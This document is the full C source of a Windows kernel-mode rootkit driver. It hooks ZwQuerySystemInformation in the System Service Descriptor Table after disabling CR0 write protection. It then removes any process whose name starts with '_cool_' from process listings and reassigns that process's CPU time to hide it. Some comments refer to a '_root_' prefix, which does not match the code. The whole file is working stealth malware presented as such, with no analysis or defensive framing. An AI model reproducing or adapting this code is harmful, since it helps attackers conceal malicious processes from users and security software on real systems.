// BASIC ROOTKIT that hides processes

#include "ntddk.h"

#define DWORD unsigned long
#define WORD unsigned short
#define BOOL unsigned long

#pragma pack(1)
typedef struct ServiceDescriptorEntry {
	unsigned int *ServiceTableBase;
	unsigned int *ServiceCounterTableBase; //Used only in checked build
	unsigned int NumberOfServices;
	unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()

__declspec(dllimport)  ServiceDescriptorTableEntry_t KeServiceDescriptorTable;
#define SYSTEMSERVICE(_function) KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)_function+1)]

// Length of process name (rounded up to next DWORD)
#define PROCNAMELEN     20
// Maximum length of NT process name
#define NT_PROCNAMELEN  16

ULONG gProcessNameOffset;

struct _SYSTEM_THREADS
{
        LARGE_INTEGER           KernelTime;
        LARGE_INTEGER           UserTime;
        LARGE_INTEGER           CreateTime;
        ULONG                           WaitTime;
        PVOID                           StartAddress;
        CLIENT_ID                       ClientIs;
        KPRIORITY                       Priority;
        KPRIORITY                       BasePriority;
        ULONG                           ContextSwitchCount;
        ULONG                           ThreadState;
        KWAIT_REASON            WaitReason;
};

struct _SYSTEM_PROCESSES
{
        ULONG                           NextEntryDelta;
        ULONG                           ThreadCount;
        ULONG                           Reserved[6];
        LARGE_INTEGER           CreateTime;
        LARGE_INTEGER           UserTime;
        LARGE_INTEGER           KernelTime;
        UNICODE_STRING          ProcessName;
        KPRIORITY                       BasePriority;
        ULONG                           ProcessId;
        ULONG                           InheritedFromProcessId;
        ULONG                           HandleCount;
        ULONG                           Reserved2[2];
        VM_COUNTERS                     VmCounters;
        IO_COUNTERS                     IoCounters; //windows 2000 only
        struct _SYSTEM_THREADS          Threads[1];
};

// added -Creative
struct _SYSTEM_PROCESSOR_TIMES
{
		LARGE_INTEGER					IdleTime;
		LARGE_INTEGER					KernelTime;
		LARGE_INTEGER					UserTime;
		LARGE_INTEGER					DpcTime;
		LARGE_INTEGER					InterruptTime;
		ULONG							InterruptCount;
};

// added -Creative
LARGE_INTEGER					m_UserTime;
LARGE_INTEGER					m_KernelTime;

// function prototype
NTSYSAPI
NTSTATUS
NTAPI ZwQuerySystemInformation(
            IN ULONG SystemInformationClass,
                        IN PVOID SystemInformation,
                        IN ULONG SystemInformationLength,
                        OUT PULONG ReturnLength);

// typedef so we can make a working call thru the saved pointer
typedef NTSTATUS (*ZWQUERYSYSTEMINFORMATION)(
            ULONG SystemInformationCLass,
			PVOID SystemInformation,
			ULONG SystemInformationLength,
			PULONG ReturnLength
);

ZWQUERYSYSTEMINFORMATION 	OldZwQuerySystemInformation;

/* Find the offset of the process name within the executive process
   block.  We do this by searching for the first occurance of "System"
   in the current process when the device driver is loaded. */

void GetProcessNameOffset()
{
  PEPROCESS curproc = PsGetCurrentProcess();
  int i;
  for( i = 0; i < 3*PAGE_SIZE; i++ ) 
  {
      if( !strncmp( "System", (PCHAR) curproc + i, strlen("System") ))
	{
	  gProcessNameOffset = i;
	}
  }
}

/* Copy the process name into the specified buffer.  */

ULONG GetProcessName( PCHAR theName )
{
  PEPROCESS       curproc;
  char            *nameptr;
  ULONG           i;
  KIRQL           oldirql;

  if( gProcessNameOffset ) 
    {
      curproc = PsGetCurrentProcess();
      nameptr   = (PCHAR) curproc + gProcessNameOffset;
      strncpy( theName, nameptr, NT_PROCNAMELEN );
      theName[NT_PROCNAMELEN] = 0; /* NULL at end */
      return TRUE;
    } 
  return FALSE;
}


NTSTATUS NewZwQuerySystemInformation(IN ULONG SystemInformationClass,
									 IN PVOID SystemInformation,
									 IN ULONG SystemInformationLength,
									 OUT PULONG ReturnLength)
{
	NTSTATUS rc;

	CHAR aProcessName[PROCNAMELEN];		
	GetProcessName( aProcessName );
	DbgPrint("Rootkit: NewZwQuerySystemInformation() from %s\n", aProcessName);


    rc = ((ZWQUERYSYSTEMINFORMATION)(OldZwQuerySystemInformation)) (
                    SystemInformationClass,
                    SystemInformation,
                    SystemInformationLength,
                    ReturnLength );

	DbgPrint("   real ZwQuerySystemInfo returned %d", rc);

	if( NT_SUCCESS( rc ) ) 
    {
        // double check the process name, if it starts w/ '_root_' DO NOT
        // apply any stealth
        if(0 == memcmp(aProcessName, "_cool_", 6))
        {
			DbgPrint("Rootkit: detected system query from _root_ process\n");
        }
        else if( 5 == SystemInformationClass )
        {
            // this is a process list, look for process names that start with
            // '_root_'
            int iChanged = 0;
			struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES *)SystemInformation;
            struct _SYSTEM_PROCESSES *prev = NULL;
			
            while(curr)
            {       
                //struct _SYSTEM_PROCESSES *next = ((char *)curr += curr->NextEntryDelta);
                
                ANSI_STRING process_name;
                RtlUnicodeStringToAnsiString( &process_name, &(curr->ProcessName), TRUE);
                if( (0 < process_name.Length) && (255 > process_name.Length) )
                {

					// TODO: Change the prefix of the process to hide
                    if(0 == memcmp( process_name.Buffer, "_cool_", 6))
                    {
                        //////////////////////////////////////////////
                        // we have a winner!
                        //////////////////////////////////////////////
                        char _output[255];
                        char _pname[255];
                        memset(_pname, 0, 255);
                        memcpy(_pname, process_name.Buffer, process_name.Length);

                        DbgPrint("Rootkit: hiding process, pid: %d\tname: %s\r\n", 
                                  curr->ProcessId, 
                                  _pname);

						iChanged = 1;

						m_UserTime.QuadPart += curr->UserTime.QuadPart;
						m_KernelTime.QuadPart += curr->KernelTime.QuadPart;

                        if(prev)
                        {
                                if(curr->NextEntryDelta)
                                {
                                        // make prev skip this entry
                                        prev->NextEntryDelta += curr->NextEntryDelta;
                                }
                                else
                                {
                                        // we are last, so make prev the end
                                        prev->NextEntryDelta = 0;
                                }
                        }
                        else
                        {
                                if(curr->NextEntryDelta)
                                {
                                        // we are first in the list, so move it forward
                                        (char *)SystemInformation += curr->NextEntryDelta;
                                }
                                else
                                {
                                        // we are the only process!
                                        SystemInformation = NULL;
                                }
                        }
                    }
                }
				else
				{
					//add the times of _root_* processes to the Idle process
					curr->UserTime.QuadPart += m_UserTime.QuadPart;
					curr->KernelTime.QuadPart += m_KernelTime.QuadPart;
					m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
				}
                RtlFreeAnsiString(&process_name);
                
				if (0 == iChanged)
					prev = curr;
				else
					iChanged = 0;

                if(curr->NextEntryDelta) ((char *)curr += curr->NextEntryDelta);
                else curr = NULL;
            }
        }
		else if (8 == SystemInformationClass)			//SystemProcessorTimes
		{
			struct _SYSTEM_PROCESSOR_TIMES * times = (struct _SYSTEM_PROCESSOR_TIMES *)SystemInformation;
			times->IdleTime.QuadPart += m_UserTime.QuadPart + m_KernelTime.QuadPart;
		}
    }

	return rc;
}

VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
{
	DbgPrint("Rootkit: OnUnload called\n");

	// UNProtect memory
	__asm
	{
		push	eax
		mov		eax, CR0
		and		eax, 0FFFEFFFFh
		mov		CR0, eax
		pop		eax
	}

	// put back the old function pointer
	InterlockedExchange( (PLONG) &SYSTEMSERVICE(ZwQuerySystemInformation), 
						 (LONG) OldZwQuerySystemInformation);

	// REProtect memory
	__asm
	{
		push	eax
		mov		eax, CR0
		or		eax, NOT 0FFFEFFFFh
		mov		CR0, eax
		pop		eax
	}
}

NTSTATUS DriverEntry( IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath )
{
	DbgPrint("Rootkit: WE ARE ALIVE! Let the hiding begin.\n");

	GetProcessNameOffset();

	theDriverObject->DriverUnload  = OnUnload; 

	// UNProtect memory
	__asm
	{
		push	eax
		mov		eax, CR0
		and		eax, 0FFFEFFFFh
		mov		CR0, eax
		pop		eax
	}


	OldZwQuerySystemInformation = 
		(ZWQUERYSYSTEMINFORMATION) InterlockedExchange(		(PLONG) &SYSTEMSERVICE(ZwQuerySystemInformation), 
															(LONG) NewZwQuerySystemInformation);
	// REProtect memory
	__asm
	{
		push	eax
		mov		eax, CR0
		or		eax, NOT 0FFFEFFFFh
		mov		CR0, eax
		pop		eax
	}

	return STATUS_SUCCESS;
}

